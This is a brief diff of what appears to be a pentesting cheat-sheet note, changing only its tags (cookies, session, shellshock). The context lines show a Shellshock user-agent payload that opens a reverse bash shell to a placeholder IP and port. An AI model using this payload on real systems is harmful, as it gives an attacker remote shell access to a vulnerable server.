@@ -36,4 +36,4 @@ In user agent:
 () { :; }; bash -i >& /dev/tcp/<ip>/<port> 0>&1
 ```
 
-tags: misc cookies session shellshock
+tags: #misc #cookies #session #shellshock 
